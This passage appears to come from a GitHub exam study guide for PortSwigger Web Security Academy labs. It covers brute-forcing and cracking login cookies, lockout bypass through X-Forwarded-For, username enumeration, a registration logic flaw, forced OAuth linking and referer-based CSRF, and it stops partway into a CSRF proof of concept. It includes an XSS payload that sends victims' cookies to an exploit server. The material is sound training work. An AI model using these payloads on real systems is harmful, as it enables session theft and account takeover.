<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="GET /admin HTTP/2
Host: TARGET.web-security-academy.net
Cookie: session=VictimAdminSessionCookieValue
Cache-Control: max-age=0
Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;109&quot;, &quot;Not_A Brand&quot;;v=&quot;99&quot;
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: &quot;Linux&quot;"><pre class="notranslate"><code>GET /admin HTTP/2
Host: TARGET.web-security-academy.net
Cookie: session=VictimAdminSessionCookieValue
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="109", "Not_A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
</code></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/admin-panel-access.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/admin-panel-access.png" alt="admin-panel-access" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling" rel="nofollow">PortSwigger Lab: Response queue poisoning via H2.TE request smuggling</a></p>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Brute Force</h2><a id="user-content-brute-force" class="anchor" aria-label="Permalink: Brute Force" href="#brute-force"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><a href="#stay-logged-in">Stay-Logged-in</a><br>
<a href="#stay-logged-in-offline-crack">Stay-logged-in Offline Crack</a><br>
<a href="#brute-force-protected-login">Brute Force Protected Login</a><br>
<a href="#subtly-invalid-login">Subtly Invalid Login</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Stay-Logged-in</h3><a id="user-content-stay-logged-in" class="anchor" aria-label="Permalink: Stay-Logged-in" href="#stay-logged-in"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Login option with a stay-logged-in check-box result in Cookie value containing the password of the user logged in and is vulnerable to brute-forcing.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/stay-logged-in.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/stay-logged-in.png" alt="stay-logged-in" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">The exploit steps below plus the Intruder Payload processing rules in order and including the GREP option in sequence before starting the attack.</p>
</blockquote>
<ol dir="auto">
<li>Logout as current user.</li>
<li>Send the most recent GET /my-account request to Burp Intruder.</li>
<li>Select the cookie: <code>stay-logged-in</code> as injection position.</li>
<li>Hash: <code>MD5</code></li>
<li>Add prefix: <code>carlos:</code></li>
<li>Encode: <code>Base64-encode</code></li>
<li>Add <strong>GREP</strong> under settings tab, to check for the string in the response <code>Update email</code> indicating successfully logged in attack.</li>
</ol>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/brute.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/brute.png" alt="brute" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie" rel="nofollow">PortSwigger Lab: Brute-forcing a stay-logged-in cookie</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Stay-logged-in Offline Crack</h3><a id="user-content-stay-logged-in-offline-crack" class="anchor" aria-label="Permalink: Stay-logged-in Offline Crack" href="#stay-logged-in-offline-crack"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">The blog application comment function is vulnerable to <a href="#stored-xss">stored XSS</a>, use the below payload in blog comment to send the session cookie of Carlos to the exploit server.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="&lt;script&gt;
document.location='https://EXPLOIT.net/StealCookie='+document.cookie
&lt;/script&gt;"><pre class="notranslate"><code>&lt;script&gt;
document.location='https://EXPLOIT.net/StealCookie='+document.cookie
&lt;/script&gt;
</code></pre></div>
<blockquote>
<p dir="auto">Base64 decode the <code>stay-logged-in</code> cookie value and use an online <strong>MD5</strong> hash crack station database.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/stay-logged-in-offline.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/stay-logged-in-offline.png" alt="stay-logged-in Offline" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking" rel="nofollow">PortSwigger Lab: Offline password cracking</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Brute Force Protected Login</h3><a id="user-content-brute-force-protected-login" class="anchor" aria-label="Permalink: Brute Force Protected Login" href="#brute-force-protected-login"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto"><em><strong>Identified</strong></em> brute force protection on login when back-end enforce 30 minute ban, resulting in <strong>IP blocked</strong> after too many invalid login attempts. Testing <code>X-Forwarded-For:</code> header result in bypass of brute force protection. Observing the response time with long invalid password, mean we can use <strong>Pitchfork</strong> technique to <em><strong>identify</strong></em> first valid usernames with random long password and then rerun intruder with <strong>Pitchfork</strong>, set each payload position attack iterates through all sets simultaneously.</p>
</blockquote>
<p dir="auto"><a href="https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/wordlists">Burp Lab Username, Password and directory fuzzing Word lists</a></p>
<blockquote>
<p dir="auto">Payload position 1 on IP address for <code>X-Forwarded-For:</code> and position 2 on username with a long password to see the <strong>response time delay</strong> in attack columns window.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="X-Forwarded-For: 12.13.14.15"><pre class="notranslate"><code>X-Forwarded-For: 12.13.14.15
</code></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/pitchfork.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/pitchfork.png" alt="Intruder Pitchfork" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Repeat above <strong>Pitchfork</strong> intruder attack on the password field and then <em><strong>identify</strong></em> valid password from the status column with 302 result.</p>
</blockquote>
<p dir="auto"><a href="https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing" rel="nofollow">PortSwigger Lab: Username enumeration via response timing</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Subtly Invalid Login</h3><a id="user-content-subtly-invalid-login" class="anchor" aria-label="Permalink: Subtly Invalid Login" href="#subtly-invalid-login"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto"><em><strong>Identify</strong></em> that the login page &amp; password reset is not protected by brute force attack, and no IP block or time-out enforced for invalid username or password.</p>
</blockquote>
<blockquote>
<p dir="auto">Tip for the BSCP Exam, there is sometimes another user with weak password that can be brute forced. Carlos is not always the account to target to give a foothold access in stage 1.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/subtly-invalid-login.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/subtly-invalid-login.png" alt="Subtly invalid login" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Notice on the Intruder attack column for the GREP value, <code>Invalid username or password.</code> the one response message for a failed username attack do not contain full stop period at the end. Repeat the attack with this <em><strong>identified</strong></em> username, and <strong>Sniper</strong> attack the password field to <em><strong>identify</strong></em> <code>302</code> response for valid login.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/refresh-password.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/refresh-password.png" alt="Refresh Password" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">In the BSCP exam <em><strong>lookout</strong></em> for other messages returned that are different and disclose valid accounts on the application and allow the brute force <em><strong>identified</strong></em> of account passwords, such as example on the <a href="#refresh-password-broken-logic">refresh password reset</a> function.</p>
</blockquote>
<blockquote>
<p dir="auto">Once valid username identified from different response message, the perform <a href="#brute-force">brute force</a> using Burp Intruder on the password.</p>
</blockquote>
<p dir="auto"><a href="https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses" rel="nofollow">PortSwigger Lab: Username enumeration via subtly different responses</a></p>
<blockquote>
<p dir="auto">Another scenario to identify valid username on the WEB APP is to provide list of usernames on login and one invalid password value. In the Intruder attack results one response will contain message <code>Incorrect password</code>.<br>
Intruder attack injection position, <code>username=invalid-username&amp;password=SomeStupidLongCrazyWrongSecretPassword123456789</code>.</p>
</blockquote>
<p dir="auto"><a href="https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses" rel="nofollow">PortSwigger Lab: Username enumeration via different responses</a></p>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Authentication</h2><a id="user-content-authentication" class="anchor" aria-label="Permalink: Authentication" href="#authentication"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><a href="#account-registration">Account Registration</a><br>
<a href="#auth-token-bypass-macro">Auth Token bypass Macro</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Account Registration</h3><a id="user-content-account-registration" class="anchor" aria-label="Permalink: Account Registration" href="#account-registration"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Business logic flaw in the account registration feature allow for gaining foothold as target user role access. <a href="#content-discovery">Content Discovery</a> find the path <code>/admin</code>, message state the Admin interface is only available if logged in as a <strong>DontWannaCry</strong> user.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/register-length-flaw.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/register-length-flaw.png" alt="Register length flaw" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Creating email with more that 200 character before the <code>@</code> symbol is then truncated to 255 characters. This <em><strong>identify</strong></em> the vulnerability in the account registration page logic <strong>flaw</strong>. In the email below the <code>m</code> at the end of <code>@dontwannacry.com</code> is character 255 exactly.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="very-long-strings-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-strings@dontwannacry.com.exploit-0afe007b03a34169c10b8fc501510091.exploit-server.net"><pre class="notranslate"><code>very-long-strings-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-strings@dontwannacry.com.exploit-0afe007b03a34169c10b8fc501510091.exploit-server.net
</code></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/Inconsistent-handling-exceptional-input.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/Inconsistent-handling-exceptional-input.png" alt="Inconsistent-handling-exceptional-input" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input" rel="nofollow">PortSwigger Lab: Inconsistent handling of exceptional input</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Auth Token bypass Macro</h3><a id="user-content-auth-token-bypass-macro" class="anchor" aria-label="Permalink: Auth Token bypass Macro" href="#auth-token-bypass-macro"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">If the authentication login is protected against brute force by using random token that is used on every login POST, a Burp Macro can be used to bypass protection.</p>
</blockquote>
<blockquote>
<p dir="auto">Create Burp Macro</p>
</blockquote>
<ol dir="auto">
<li>Open Proxy settings and select <strong>sessions</strong> under Project choices.</li>
<li>Scroll down to <code>Macros</code>, and add new macro.</li>
<li>Select <strong>request</strong> from the list to use for the value to be used.</li>
<li>click <code>Configure item</code> and add custom parameter location to extract.</li>
<li>Click <strong>OK</strong> to return to Sessions under Project choices.</li>
<li>Add a Session handling <strong>rule</strong>, and the editor dialogue opens.</li>
<li>In the dialogue, go to the "Scope" tab.</li>
<li>Under scope for the session handling rule editor, <strong>check</strong> Target, Intruder, and Repeater.</li>
<li>Still under "URL Scope", select <code>Include all URLs</code>.</li>
<li>Close Settings.</li>
</ol>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/create-macro.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/create-macro.png" alt="How To Create a Macro in Burp Suite Professional" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money" rel="nofollow">PortSwigger Lab: Infinite money logic flaw - show how to create Burp Macro</a></p>
<hr>
<div class="markdown-heading" dir="auto"><h1 tabindex="-1" class="heading-element" dir="auto">Privilege Escalation</h1><a id="user-content-privilege-escalation" class="anchor" aria-label="Permalink: Privilege Escalation" href="#privilege-escalation"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">CSRF Account Takeover</h2><a id="user-content-csrf-account-takeover" class="anchor" aria-label="Permalink: CSRF Account Takeover" href="#csrf-account-takeover"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><a href="#oauth">OAuth</a><br>
<a href="#referer-validation-csrf">Referer Validation CSRF</a><br>
<a href="#referer-header-present">Referer Header Present</a><br>
<a href="#lastsearchterm">LastSearchTerm</a><br>
<a href="#csrf-duplicated-in-cookie">CSRF duplicated in cookie</a><br>
<a href="#csrf-token-present">CSRF Token Present</a><br>
<a href="#is-logged-in">Is Logged In</a><br>
<a href="#csrf-no-defences">CSRF No Defences</a><br>
<a href="#samesite-strict-bypass">SameSite Strict bypass</a><br>
<a href="#samesite-lax-bypass">SameSite Lax bypass</a></p>
<blockquote>
<p dir="auto">Cross-Site Request Forgery vulnerability allows an attacker to force users to perform actions that they did not intend to perform. This can enable attacker to change victim email address and use password reset to take over the account.</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">OAuth</h3><a id="user-content-oauth" class="anchor" aria-label="Permalink: OAuth" href="#oauth"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">oAuth linking exploit server hosting iframe, then deliver to victim, forcing user to update code linked.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/csrf.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/csrf.png" alt="csrf" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Intercepted the GET /oauth-linking?code=[...]. send to repeat to save code. <strong>Drop</strong> the request. Important to ensure that the code is not used and, remains valid. Save on exploit server an iframe in which the <code>src</code> attribute points to the URL you just copied.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;iframe src=&quot;https://TARGET.net/oauth-linking?code=STOLEN-CODE&quot;&gt;&lt;/iframe&gt;"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">iframe</span> <span class="pl-c1">src</span>="<span class="pl-s">https://TARGET.net/oauth-linking?code=STOLEN-CODE</span>"<span class="pl-kos">&gt;</span><span class="pl-kos">&lt;/</span><span class="pl-ent">iframe</span><span class="pl-kos">&gt;</span></pre></div>
<p dir="auto"><a href="https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking" rel="nofollow">PortSwigger Lab: Forced OAuth profile linking</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Referer Validation CSRF</h3><a id="user-content-referer-validation-csrf" class="anchor" aria-label="Permalink: Referer Validation CSRF" href="#referer-validation-csrf"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto"><em><strong>Identify</strong></em> the change email function is vulnerable to CSRF by observing when the <strong>Referer</strong> header value is changed the response give message, <code>Invalid referer header</code>, and the email change is accepted when the referrer value contains the expected target domain somewhere in the value.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/identify-csrf-referer-header-check.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/identify-csrf-referer-header-check.png" alt="identify csrf referer header check" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Adding original domain of target and append <code>history.pushState('', '', '/?TARGET.net');</code> to the <strong>Referer header</strong> in the form of a query string, allow the change email to update.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="Referrer-Policy: unsafe-url"><pre>Referrer-Policy: unsafe-url</pre></div>
<blockquote>
<p dir="auto"><strong>Note:</strong> Unlike the normal Referer header spelling, the word <strong>"referrer"</strong> must be spelled correctly in the above <code>head</code> section of the exploit server.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/referer-csrf.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/referer-csrf.png" alt="Referer csrf" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Create a CSRF proof of concept exploit and host it on the exploit server. Edit the JavaScript so that the third argument of the <strong>history.pushState()</strong> function includes a query string with target URL.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;html&gt;
  &lt;!-- CSRF PoC -  CSRF with broken Referer validation --&gt;
  &lt;body&gt;
	&lt;script&gt;
